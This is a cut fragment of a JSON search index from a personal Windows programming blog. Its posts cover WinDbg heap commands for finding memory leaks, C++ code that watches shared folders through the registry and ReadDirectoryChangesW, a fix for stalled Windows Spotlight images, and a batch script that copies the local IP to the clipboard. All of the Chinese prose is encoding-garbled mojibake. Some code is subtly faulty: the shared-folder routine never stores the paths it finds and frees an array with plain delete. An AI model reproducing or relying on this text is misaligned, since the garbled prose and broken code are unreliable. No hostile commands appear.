vld","tags":[{"name":"C++","slug":"C","permalink":"https://hodlyounger.github.io/tags/C/"},{"name":"tools","slug":"tools","permalink":"https://hodlyounger.github.io/tags/tools/"},{"name":"å†…å­˜æ³„æ¼","slug":"å†…å­˜æ³„æ¼","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"å†…å­˜æ³„æ¼","slug":"A-OS/Windows/å†…å­˜æ³„æ¼","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/"}]},{"title":"ã€å†…å­˜æ³„æ¼ã€‘windbg å®šä½å†…å­˜æ³„æ¼","date":"2023-10-27T01:24:02.015Z","path":"A_OS/Windows/å†…å­˜æ³„æ¼/ã€å†…å­˜æ³„æ¼ã€‘WinDbgå®šä½å†…å­˜æ³„æ¼/","text":"æ¦‚è¿°ï¼šä½¿ç”¨ Windbg å®šä½å†…å­˜æ³„æ¼ [toc] windbg å®šä½å†…å­˜æ³„æ¼ ä¸»è¦ä½¿ç”¨ !heap å‘½ä»¤ ä½¿ç”¨Windbgæ£€æµ‹Windowsç¨‹åºå†…å­˜æ³„æ¼çš„æ­¥éª¤å¦‚ä¸‹ï¼š å¯åŠ¨ç¨‹åºï¼šä½¿ç”¨Windbgå¯åŠ¨éœ€è¦æ£€æµ‹å†…å­˜æ³„æ¼çš„ç¨‹åºï¼Œå¯ä»¥é€šè¿‡åœ¨Windbgä¸­é€‰æ‹©â€œæ–‡ä»¶â€-&gt;â€œæ‰“å¼€ç¨‹åºâ€æ¥æ‰“å¼€ç¨‹åºã€‚ è®¾ç½®ç¬¦å·è·¯å¾„ï¼šåœ¨Windbgä¸­ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®ç¬¦å·è·¯å¾„æ¥åŠ è½½ç¨‹åºçš„ç¬¦å·ä¿¡æ¯ï¼Œæ–¹ä¾¿è°ƒè¯•ã€‚å¯ä»¥é€šè¿‡åœ¨Windbgä¸­è¾“å…¥â€œ.sympathâ€å‘½ä»¤æ¥è®¾ç½®ç¬¦å·è·¯å¾„ï¼Œä¾‹å¦‚ï¼š 1.sympath+ C:\\Symbols å…¶ä¸­ï¼ŒC:\\Symbolsæ˜¯ç¬¦å·æ–‡ä»¶çš„è·¯å¾„ã€‚ å¯ç”¨gflagsï¼šgflagsæ˜¯Windowsæä¾›çš„ä¸€ä¸ªå·¥å…·ï¼Œå¯ä»¥ç”¨æ¥è®¾ç½®ç¨‹åºçš„è°ƒè¯•æ ‡å¿—ã€‚å¯ä»¥é€šè¿‡åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ä»¥ä¸‹å‘½ä»¤æ¥å¯ç”¨gflagsï¼š 1gflags /i your_program.exe +ust å…¶ä¸­ï¼Œyour_program.exeæ˜¯éœ€è¦æ£€æµ‹å†…å­˜æ³„æ¼çš„ç¨‹åºçš„åç§°ã€‚ è¿è¡Œç¨‹åºï¼šåœ¨Windbgä¸­ï¼Œå¯ä»¥é€šè¿‡è¾“å…¥â€œgâ€å‘½ä»¤æ¥è¿è¡Œç¨‹åºã€‚ æ£€æµ‹å†…å­˜æ³„æ¼ï¼šåœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå¯ä»¥é€šè¿‡è¾“å…¥â€œ!heap -sâ€å‘½ä»¤æ¥æŸ¥çœ‹ç¨‹åºçš„å †å†…å­˜ä½¿ç”¨æƒ…å†µï¼Œä¾‹å¦‚ï¼š 1!heap -s è¯¥å‘½ä»¤ä¼šè¾“å‡ºç¨‹åºçš„å †å†…å­˜ä½¿ç”¨æƒ…å†µï¼ŒåŒ…æ‹¬å·²åˆ†é…çš„å†…å­˜å—æ•°é‡ã€å·²é‡Šæ”¾çš„å†…å­˜å—æ•°é‡ã€å·²åˆ†é…çš„å†…å­˜å—æ€»å¤§å°ã€å·²é‡Šæ”¾çš„å†…å­˜å—æ€»å¤§å°ç­‰ä¿¡æ¯ã€‚ è¾“å‡ºå†…å­˜æ³„æ¼ä¿¡æ¯ï¼šåœ¨ç¨‹åºè¿è¡Œç»“æŸåï¼Œå¯ä»¥é€šè¿‡è¾“å…¥â€œ!heap -stat -h handleâ€å‘½ä»¤æ¥è¾“å‡ºå†…å­˜æ³„æ¼ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š 1!heap -stat -h handle è¯¥å‘½ä»¤ä¼šè¾“å‡ºç¨‹åºä¸­æ‰€æœ‰æœªé‡Šæ”¾çš„å†…å­˜å—çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬å†…å­˜å—çš„å¤§å°ã€åœ°å€ã€åˆ†é…ä½ç½®ç­‰ä¿¡æ¯ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨Windbgæ£€æµ‹å†…å­˜æ³„æ¼éœ€è¦ä¸€å®šçš„è°ƒè¯•ç»éªŒå’ŒæŠ€å·§ï¼Œå¯¹ç¨‹åºçš„æ€§èƒ½ä¹Ÿä¼šäº§ç”Ÿä¸€å®šçš„å½±å“ã€‚å› æ­¤ï¼Œåœ¨æ­£å¼å‘å¸ƒç¨‹åºä¹‹å‰ï¼Œåº”è¯¥å…³é—­gflagsåŠŸèƒ½ã€‚å¯ä»¥é€šè¿‡åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ä»¥ä¸‹å‘½ä»¤æ¥å…³é—­gflagsï¼š 1gflags /i your_program.exe -ust å…¶ä¸­ï¼Œyour_program.exeæ˜¯éœ€è¦å…³é—­gflagsåŠŸèƒ½çš„ç¨‹åºçš„åç§°ã€‚","tags":[{"name":"å†…å­˜æ³„æ¼","slug":"å†…å­˜æ³„æ¼","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/"},{"name":"Windows/windbg","slug":"Windows-windbg","permalink":"https://hodlyounger.github.io/tags/Windows-windbg/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"å†…å­˜æ³„æ¼","slug":"A-OS/Windows/å†…å­˜æ³„æ¼","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/"}]},{"title":"ã€Windowsã€‘å…±äº«æ–‡ä»¶å¤¹","date":"2023-10-27T01:24:02.013Z","path":"A_OS/Windows/å…±äº«æ–‡ä»¶å¤¹/ã€winã€‘å…±äº«æ–‡ä»¶å¤¹/","text":"æœ€è¿‘ç”±äºé¡¹ç›®éœ€æ±‚ï¼Œéœ€è¦ç¼–å†™ä¸€ä¸ªç›‘æ§æœ¬æœºå…±äº«æ–‡ä»¶å¤¹çš„å˜åŒ–çš„æ¨¡å—ï¼Œç»è¿‡æŸ¥è¯¢èµ„æ–™ï¼Œæ‰¾åˆ°å¹¶å®ç°äº†ä¸€ä¸ªè¾ƒä¸ºç¨³å®šçš„æ–¹å¼ é¡¹ç›®å®ç°æ˜¯ä½¿ç”¨ Win32 C++çš„ï¼Œæµ‹è¯•å¹³å°æ˜¯ Win 7 64 å’Œ Win 10 64ï¼ŒXP æµ‹è¯•ä¹Ÿæ˜¯å¥½ä½¿çš„ã€‚ä¸‹é¢æ˜¯å…·ä½“å®ç° é¦–å…ˆè¦è·å–å¹¶ç›‘æ§ç³»ç»Ÿå…±äº«æ–‡ä»¶å¤¹çš„è·¯å¾„ï¼Œç›¸å…³æ³¨å†Œè¡¨è·¯å¾„ä¸º HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanmanServer\\Share , ä»–çš„å€¼çš„æ ¼å¼ä¸ºå¦‚å›¾æ‰€ç¤ºï¼Œ 0x01 C++ è·å–å…±äº«æ–‡ä»¶å¤¹ç›®å½• 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091BOOL GetSharedFoldersList(map &lt;CString, HANDLE&gt; &amp;theList)&#123; BOOL bFlag = FALSE; HKEY hKey = NULL; do &#123; //æ¸…ç©ºåˆ—è¡¨ theList.clear(); //HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanmanServer\\Share //é€šè¿‡æ³¨å†Œè¡¨è·å–å…±äº«æ–‡ä»¶å¤¹åˆ—è¡¨ HKEY rootKey = REG_SHARE_KEY; CString szRegPath = REG_SHARE_PATH; int ErrCode; if (ERROR_SUCCESS != (ErrCode = RegOpenKeyEx(rootKey, szRegPath, 0, KEY_READ | KEY_WOW64_64KEY, &amp;hKey))) &#123; break; &#125; TCHAR szValue [MAX_VALUE_NAME] = &#123; 0 &#125;; DWORD dwValueSize = MAX_VALUE_NAME; int index = 0; DWORD dwBufferSize = 255; DWORD dwType; TCHAR *szValBuffer = NULL; DWORD dwSize; while (ERROR_NO_MORE_ITEMS != RegEnumValue ( hKey, index, szValue, &amp;dwValueSize, NULL, &amp;dwType, NULL, &amp;dwBufferSize)) &#123; //åˆ¤æ–­å€¼ç±»å‹ switch(dwType) &#123; //åªæ‰¾å¤šä¸ªä¸²çš„å€¼ case REG_MULTI_SZ: &#123; dwSize = dwBufferSize + 1; szValBuffer = new TCHAR [dwSize]; ZeroMemory(szValBuffer, dwSize); if (ERROR_SUCCESS != RegQueryValueEx(hKey, szValue, 0, &amp;dwType, (LPBYTE)szValBuffer, &amp;dwBufferSize)) &#123; break; &#125; int j = 0; CString TmpValue; for(int i = 0; szValBuffer [i] != &#x27;\\0&#x27; ; i += j + 1) &#123; for (j = 0; szValBuffer [i + j] != &#x27;\\0&#x27;; j ++) &#123; TmpValue += szValBuffer [i + j]; &#125; //å¦‚æœæ‰¾åˆ°å…±äº«è·¯å¾„ï¼Œåˆ™ç›´æ¥æ”¾å…¥å®¹å™¨ï¼Œç„¶åè¿›è¡Œä¸‹ä¸€ä¸ªè·¯å¾„çš„æŸ¥æ‰¾ if (TmpValue.Find(_T(&quot;Path =&quot;)) == 0) &#123; //m_vSharedList.push_back(TmpValue.Right(TmpValue.GetLength() - 5)); CString Tmp = TmpValue.Right(TmpValue.GetLength() - 5); CString szTmp = Tmp; Tmp.MakeLower(); break; &#125; TmpValue = _T(&quot;&quot;); &#125; delete szValBuffer; szValBuffer = NULL; break; &#125; //å…¶ä»–ç±»å‹è·³è¿‡ default: &#123; break; &#125; &#125; dwValueSize = MAX_VALUE_NAME; dwBufferSize = 255; index ++; &#125; bFlag = TRUE; &#125;while(FALSE); if (hKey != NULL) &#123; RegCloseKey(hKey); &#125; return bFlag;&#125; 0x02 C++ç›‘æ§å…±äº«æ³¨å†Œè¡¨å˜åŒ– æ–¹å¼ä¸€ åˆ›å»ºçº¿ç¨‹ï¼Œè°ƒç”¨ RegNotifyChangeKeyValue 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131//ç›‘æ§æ³¨å†Œè¡¨é¡¹ä»¥æ›´æ–°å…±äº«æ–‡ä»¶å¤¹åˆ—è¡¨DWORD WINAPI SharedMonitor:: RefreshThread(LPVOID lpParam)&#123; SharedMonitor *pThis = (SharedMonitor *)lpParam; //åªç›‘æ§å€¼çš„æ”¹å˜ DWORD dwFilter = REG_NOTIFY_CHANGE_LAST_SET; HKEY hKey; HKEY rootKey = REG_SHARE_KEY; CString szRegPath = REG_SHARE_PATH; //ç­‰å¾… 10 åˆ†é’Ÿ int iWaitTime = 10 * 60 * 1000; while (TRUE) &#123; //ç›‘æ§æ³¨å†Œè¡¨é¡¹æ”¹å˜ //Sleep(iWaitTime); HANDLE hEvent; BOOL bFlag = FALSE; do &#123; if (ERROR_SUCCESS != RegOpenKeyEx(rootKey, szRegPath, 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &amp;hKey)) &#123; MyDebugA (&quot;RegMonitorThread--- RegOpenKeyEx ERR!&quot;); break; &#125; if (NULL == (hEvent = CreateEvent(NULL, TRUE, FALSE, NULL))) &#123; MyDebugA (&quot;CreateEvent ERR&quot;); break; &#125; if (ERROR_SUCCESS != RegNotifyChangeKeyValue (hKey, TRUE, dwFilter, hEvent, TRUE)) &#123; MyDebugA (&quot;RegNotifyChangeKeyValue ERR&quot;); break; &#125; if (WAIT_FAILED == WaitForSingleObject (hEvent, INFINITE)) &#123; MyDebugA (&quot;WaitForSingleObject ERR&quot;); break; &#125; bFlag = TRUE; &#125;while(FALSE); RegCloseKey (hKey); CloseHandle (hEvent); //å¦‚æœç›‘æ§å¤±è´¥ï¼Œåˆ™é‡æ–°å†æ¥ if (! bFlag) &#123; continue; &#125; //ç­‰å¾…ç³»ç»Ÿå°†æ³¨å†Œè¡¨æ¶ˆæ¯å‘æ”¾å®Œæ¯•ï¼Œå¦åˆ™æœ‰æ—¶å€™æ·»åŠ æˆ–åˆ é™¤çš„æ³¨å†Œè¡¨é¡¹æ— æ³•è¢«æšä¸¾åˆ° Sleep(200); //è¿›è¡Œå…±äº«åˆ—è¡¨æšä¸¾å’Œæ¯”è¾ƒ map &lt;CString, HANDLE&gt; theNewList; //è·å–æ–°åˆ—è¡¨ pThis-&gt; GetSharedFoldersList(theNewList); map &lt;CString, HANDLE&gt; &amp;theOldList = pThis-&gt; GetListInstance(); BOOL bFindNew = FALSE; //æ¯”è¾ƒä¸¤ä¸ªåˆ—è¡¨ //æ·»åŠ æ—§åˆ—è¡¨ä¸­æ²¡æœ‰çš„å…±äº« for (map &lt;CString, HANDLE&gt;:: iterator it = theNewList.begin(); it != theNewList.end(); ++it) &#123; if (theOldList.find(it-&gt; first) == theOldList.end()) &#123; MyDebug(_T(&quot;----------Find New Share----------&quot;)); MyDebug(it-&gt; first); theOldList [it-&gt; first] = 0; bFindNew = TRUE; &#125; &#125; //MyDebug(_T(&quot;---------Start Delete--------&quot;)); //éœ€è¦åˆ é™¤çš„åˆ—è¡¨, map ä¸æ”¯æŒå¾ªç¯åˆ é™¤å¤šä¸ªå…ƒç´  vector &lt;CString&gt; theDeleteList; //åˆ é™¤æ—§åˆ—è¡¨ä¸­å·²ç»å–æ¶ˆçš„å…±äº« for (map &lt;CString, HANDLE&gt;:: iterator it = theOldList.begin(); it != theOldList.end(); ++it) &#123; if (theNewList.find(it-&gt; first) == theNewList.end()) &#123; //ç»“æŸç›‘æ§çº¿ç¨‹ if (! TerminateThread(it-&gt; second, 0)) &#123; MyDebug(_T(&quot;TerminateThread ERR&quot;)); MyDebug(it-&gt; first); &#125; //å°†çº¿ç¨‹å ç”¨çš„å…±äº«ç›®å½•å¥æŸ„é‡Šæ”¾ if (gs_mpDirHandleList [it-&gt; first]) &#123; CloseHandle(gs_mpDirHandleList [it-&gt; first]); &#125; CloseHandle(it-&gt; second); theDeleteList.push_back(it-&gt; first); &#125; &#125; MyDebug(_T(&quot;-----------DeleteList-------------&quot;)); //åˆ é™¤æ—§åˆ—è¡¨ä¸­çš„è¿‡æœŸå…±äº« for (vector &lt;CString&gt;:: iterator it = theDeleteList.begin(); it != theDeleteList.end(); ++it) &#123; theOldList.erase(*it); MyDebug(*it); &#125; //å¦‚æœæœ‰æ–°çš„å…±äº« if (bFindNew) &#123; pThis-&gt; SetSharedMonitor(); &#125; &#125; return 0;&#125; å…±äº«æ–‡ä»¶å¤¹å†…æ–‡ä»¶ç›‘æ§ æœ€åå°±æ˜¯æœ€ç»ˆçš„ç›®çš„ï¼Œå¯¹å…±äº«æ–‡ä»¶å¤¹å†…æ–‡ä»¶çš„å˜åŒ–è¿›è¡Œç›‘æ§æ“ä½œã€‚è¿™é‡Œä½¿ç”¨çš„æ˜¯ WIN32 API ReadDirectoryChangesW ï¼Œè¿™ä¸ªçš„å…·ä½“ä½¿ç”¨åœ¨æˆ‘ä¹‹å‰çš„ä¸€ç¯‡æ–‡ç« é‡Œæœ‰ä»‹ç»ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ï¼Œéœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ ReadDirectoryChangesW å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ‰€éœ€çš„å¥æŸ„éœ€è¦ CreateFile å»åˆ›å»ºï¼Œè€Œä¸”åˆ›å»ºåéœ€è¦ä¸€ç›´å ç”¨ç€ä¸èƒ½é‡Šæ”¾ï¼Œè€Œåˆ›å»ºæ—¶æ‰€éœ€çš„æƒé™(ç¬¬ä¸‰ä¸ªå‚æ•°) å¿…é¡»è®¾ç½®ä¸º FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETEï¼Œå› ä¸ºå¦‚æœå°‘ä»»æ„ä¸€ä¸ªå°±æœ‰å¯èƒ½å¯¼è‡´æŸäº›ç¬¬ä¸‰æ–¹è½¯ä»¶çš„ä½¿ç”¨å‡ºç°å¼‚å¸¸ï¼Œä¾‹å¦‚è¿…é›·ä¸‹è½½ï¼Œæµè§ˆå™¨ä¸‹è½½ä¹‹ç±»çš„ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106//ç›‘æ§çº¿ç¨‹DWORD WINAPI ATSharedMonitor:: MonitorThread(LPVOID lpParam)&#123; CString szRootPath = *(CString *)lpParam; HANDLE hRootHandle = CreateFile( szRootPath, //ç›‘æ§è·¯å¾„ FILE_LIST_DIRECTORY, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS/* | FILE_FLAG_OVERLAPPED*/, NULL); if(FAILED_HANDLE(hRootHandle)) &#123; MyDebug(_T(&quot;CreateFile Fail&quot;)); return 0; &#125; // å°†ç›®å½•å¥æŸ„æ”¾åˆ°çº¿ç¨‹å¯¹åº”å®¹å™¨ä¸­ gs_mpDirHandleList [szRootPath] = hRootHandle; // OUTPUT_PARAM_DEBUGA(&quot;The CurrentThread:%X&quot;, GetCurrentThread()); szRootPath += _T(&quot;\\\\&quot;); wchar_t notify [1024]; ZeroMemory(notify, 1024); DWORD dwBytes; FILE_NOTIFY_INFORMATION *pNotify = (FILE_NOTIFY_INFORMATION *)notify; //è¿‡æ»¤åŒä¸€ä¸ªæ–‡ä»¶çš„æ“ä½œ CString szLastFile = _T(&quot;&quot;); while (TRUE) &#123; if (ReadDirectoryChangesW (hRootHandle, &amp;notify, sizeof(notify), TRUE, FILE_NOTIFY_CHANGE_CREATION | FILE_NOTIFY_CHANGE_FILE_NAME | FILE_NOTIFY_CHANGE_DIR_NAME | FILE_NOTIFY_CHANGE_LAST_WRITE, &amp;dwBytes, NULL, NULL)) &#123; MyDebug(_T(&quot;---------Change Happened!------------&quot;)); pNotify-&gt; FileName [pNotify-&gt; FileNameLength / 2] = &#x27;\\0&#x27;; //CString tmp = pNotify-&gt; FileName; //tmp.MakeLower (); CString TmpPath = szRootPath + pNotify-&gt; FileName; switch(pNotify-&gt; Action) &#123; //é‡å‘½åè·å– case FILE_ACTION_RENAMED_OLD_NAME: &#123; MyDebug (TEXT(&quot;æ–‡ä»¶æ›´å :&quot;) + TmpPath); PFILE_NOTIFY_INFORMATION p = (PFILE_NOTIFY_INFORMATION)((char*)pNotify+pNotify-&gt; NextEntryOffset); p-&gt; FileName [p-&gt; FileNameLength/2] = &#x27;\\0&#x27;; CString newName = szRootPath + p-&gt; FileName; MyDebug(newName); break; &#125; //åˆ é™¤// case FILE_ACTION_REMOVED:// &#123;// MyDebug (TEXT(&quot;æ–‡ä»¶åˆ é™¤ :&quot;) + TmpPath);// &#125; //ä¿®æ”¹..ç•¥è¿‡æ–‡ä»¶å¤¹çš„ä¿®æ”¹, è¿‡æ»¤åŒä¸€ä¸ªæ–‡ä»¶çš„ä¿®æ”¹ case FILE_ACTION_MODIFIED: &#123; if (! PathIsDirectory(TmpPath) /*&amp;&amp; szLastFile.CompareNoCase(pNotify-&gt; FileName) != 0*/) &#123; //szLastFile = pNotify-&gt; FileName; MyDebug (TEXT(&quot;æ–‡ä»¶ä¿®æ”¹ :&quot;) + TmpPath); &#125; break; &#125; //æ–°å»ºæ–‡ä»¶è·å– case FILE_ACTION_ADDED: &#123; if (! PathIsDirectory(TmpPath) /*&amp;&amp; szLastFile.CompareNoCase(pNotify-&gt; FileName) != 0*/) &#123; MyDebug (TEXT(&quot;æ–‡ä»¶æ·»åŠ  :&quot;) + TmpPath); &#125; break; &#125; default: &#123; break; &#125; &#125; &#125; &#125; return 0;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"å…±äº«æ–‡ä»¶å¤¹","slug":"å…±äº«æ–‡ä»¶å¤¹","permalink":"https://hodlyounger.github.io/tags/%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"å…±äº«æ–‡ä»¶å¤¹","slug":"A-OS/Windows/å…±äº«æ–‡ä»¶å¤¹","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E5%85%B1%E4%BA%AB%E6%96%87%E4%BB%B6%E5%A4%B9/"}]},{"title":"ã€winã€‘èšç„¦ä¸æ›´æ–°","date":"2023-10-27T01:24:02.012Z","path":"A_OS/Windows/ã€winã€‘èšç„¦é—®é¢˜/","text":"æ¦‚è¿°ï¼šWindows èšç„¦ä¸æ›´æ–°æ—¶å¦‚ä½•ä¿®å¤ [toc] æ–¹æ¡ˆä¸€ åœ¨åº”ç”¨å•†åº—å®‰è£… dynamic theme æ–¹æ¡ˆäºŒ å…ˆå°†ä¸ªæ€§åŒ–é”å±ç•Œé¢é€‰é¡¹ç”±&quot;Windows èšç„¦&quot;æ”¹ä¸º&quot;å›¾ç‰‡&quot;ã€‚ ç„¶åå»åˆ é™¤ C:\\Users\\ä½ è‡ªå·±çš„ç”¨æˆ·å\\AppData\\Local\\Packages\\Microsoft.Windows.ContentDeliveryManager_***\\Settings (***ä¸ºéšæœºæ•°å­—)ç›®å½•ä¸‹settings.dat å’Œ roaming.lock è¿™ä¸¤ä¸ªæ–‡ä»¶ã€‚ï¼ˆæ³¨ï¼šAppData ç­‰æ˜¯éšè—çš„æ–‡ä»¶å¤¹æˆ–æ–‡ä»¶ï¼‰ å†ç„¶åå›åˆ°ä¸ªæ€§åŒ–é”å±ç•Œé¢å°†é€‰é¡¹ç”±&quot;å›¾ç‰‡&quot;æ”¹å›&quot;Windows èšç„¦&quot;ã€‚ ç¨ç­‰ï¼ŒOK! éšååº”è¯¥å¯ä»¥çœ‹åˆ° :...\\Microsoft.Windows.ContentDeliveryManager_***\\LocalState\\Assets æ–‡ä»¶å¤¹é‡Œä¸‹è½½äº†ä¸€æ‰¹èšç„¦å›¾ç‰‡ ..\\Microsoft.Windows.ContentDeliveryManager_***\\settings ç›®å½•ä¸‹é‡æ–°ç”Ÿæˆäº† settings.dat æ–‡ä»¶ã€‚","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"bug","slug":"bug","permalink":"https://hodlyounger.github.io/tags/bug/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"}]},{"title":"ã€windowsã€‘ã€cmdã€‘æ‰¹å¤„ç†è·å–ipåˆ°å‰ªåˆ‡æ¿","date":"2023-10-27T01:24:01.985Z","path":"A_OS/Windows/cmd/ã€windowsã€‘ã€cmdã€‘è·å–IPåˆ°å‰ªåˆ‡æ¿/","text":"è·å–å½“å‰ipåˆ°å‰ªåˆ‡æ¿ å®¢æˆ·ç«¯å¼€å‘è¿œç¨‹è°ƒè¯•æ¯æ¬¡éƒ½éœ€è¦è·å–æœºå™¨çš„ipï¼Œç„¶åæ‰‹åŠ¨å¡«å†™ï¼Œè¾ƒä¸ºéº»çƒ¦ï¼Œå› æ­¤ç®€å•åšäº†ä¸€ä¸ªå¯ä»¥è·å–ipåˆ°å‰ªåˆ‡æ¿å½“ä¸­çš„æ‰¹å¤„ç†è„šæœ¬ï¼Œå¯ä»¥è·å–ç³»ç»Ÿå½“å‰ipåˆ°å‰ªåˆ‡æ¿ä¸­ã€‚ [toc] è·å–ip è·å–ipçš„å‘½ä»¤æœ‰å¤šç§ï¼Œæœ€ç»ˆå®ç°å°±æ˜¯åªè¦èƒ½æ‰“å°å‡ºå½“å‰ç³»ç»Ÿipçš„å‘½ä»¤éƒ½å¯ä»¥ã€‚ ipconfig route print ä»¥ä¸‹ä¸¤ä¸ªè„šæœ¬å°±æ˜¯ä»ä¸Šè¿°ä¸¤ä¸ªå‘½ä»¤å½“ä¸­è·å–ipåœ°å€ï¼š ipconfig 1234567@echo offfor /f &quot;tokens=2 delims=:&quot; %%a in (&#x27;ipconfig ^| findstr ^^IPv4&#x27;) do (set IP=%%a)echo %IP%pause route print 1234567@echo offfor /f &quot;tokens=4&quot; %%a in (&#x27; route print ^| findstr 0.0.0.0.*0.0.0.0 ^| findstr /v &quot;é»˜è®¤&quot; &#x27;) do (set IP=%%a)echo ä½ çš„å±€åŸŸç½‘IPæ˜¯ï¼š %IP%pause for /fçš„ç”¨æ³•ï¼š åœ¨Forå‘½ä»¤è¯­è¸é¥½å‚æ•°Fä¸­ï¼Œæœ€éš¾ç†è§£çš„å°±æ˜¯Delimså’ŒTokensä¸¤ä¸ªé€‰é¡¹ï¼Œæœ¬æ–‡ç®€å•çš„åšä¸€ä¸ªæ¯”è¾ƒå’Œæ€»æ‹®ã€‚ â€œFor /fâ€å¸¸ç”¨æ¥è§£ææ–‡æœ¬ï¼Œè¯»å–å­—ç¬¦ä¸²ã€‚åˆ†å·¥ä¸Šï¼Œdelimsè´Ÿè´£åˆ‡åˆ†å­—ç¬¦ä¸²ï¼Œè€Œtokensè´Ÿè´£æå–å­—ç¬¦ä¸²ã€‚å¦‚æœæŠŠå­—ç¬¦ä¸²å½“ä½œè›‹ç³•ï¼ŒDelimsåƒåˆ€å­ï¼Œç”¨æ¥åˆ‡è›‹ç³•ï¼Œtokensåƒå‰å­ï¼Œç”¨æ¥å–åˆ‡å¥½çš„è›‹ç³•ã€‚ powershell 1(ipconfig|select-string &quot;IPv4&quot;|out-string).Split(&quot;:&quot;)[-1] è¾“å…¥åˆ°å‰ªåˆ‡æ¿ å‰ªåˆ‡æ¿çš„å…³é”®å­—ä¸ºï¼šclip ä½¿ç”¨ clip \\? å¯ä»¥æŸ¥çœ‹å¸®åŠ© 1234567891011121314151617c:\\windows\\system32&gt;clip /? clip æè¿°: å°†å‘½ä»¤è¡Œå·¥å…·çš„è¾“å‡ºé‡å®šå‘åˆ° windows å‰ªè´´æ¿ã€‚è¿™ä¸ªæ–‡æœ¬è¾“å‡ºå¯ä»¥è¢«ç²˜è´´ åˆ°å…¶ä»–ç¨‹åºä¸­ã€‚ å‚æ•°åˆ—è¡¨: /? æ˜¾ç¤ºæ­¤å¸®åŠ©æ¶ˆæ¯ã€‚ ç¤ºä¾‹: dir | clip å°†ä¸€ä»½å½“å‰ç›®å½•åˆ—è¡¨çš„å‰¯æœ¬æ”¾å…¥ windows å‰ªè´´æ¿ã€‚ clip &lt; readme.txt å°† readme.txt çš„ä¸€ä»½æ–‡æœ¬æ”¾å…¥ windows å‰ªè´´æ¿ã€‚ c:\\windows\\system32&gt; ç»“åˆä»¥ä¸Šä¸¤ä¸ªå‘½ä»¤ï¼Œè„šæœ¬ç¨å¾®ä¿®æ”¹ä¸€ä¸‹å°±èƒ½å®ç°è·å–ipåˆ°å‰ªåˆ‡ç‰ˆçš„åŠŸèƒ½ã€‚ å®Œæ•´è„šæœ¬ 123456789101112@echo offfor /f &quot;tokens=4&quot; %%a in (&#x27; route print ^| findstr 0.0.0.0.*0.0.0.0 ^| findstr /v &quot;é»˜è®¤&quot; &#x27;) do (set IP=%%a)echo ä½ çš„å±€åŸŸç½‘IPæ˜¯ï¼š %IP%echo %IP% | clippause@rem æˆ–è€…ä½¿ç”¨å®šæ—¶@rem timeout /t 5","tags":[{"name":"Windows/cmd","slug":"Windows-cmd","permalink":"https://hodlyounger.github.io/tags/Windows-cmd/"},{"name":"cmd","slug":"cmd","permalink":"https://hodlyounger.github.io/tags/cmd/"},{"name":"å‰ªåˆ‡æ¿","slug":"å‰ªåˆ‡æ¿","permalink":"https://hodlyounger.github.io/tags/%E5%89%AA%E5%88%87%E6%9D%BF/"},{"name":"Windows/æ‰¹å¤„ç†","slug":"Windows-æ‰¹å¤„ç†","permalink":"https://hodlyounger.github.io/tags/Windows-%E6%89%B9%E5%A4%84%E7%90%86/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/cmd/"}]},{"title":"ã€windowsã€‘ã€cmdã€‘åˆ 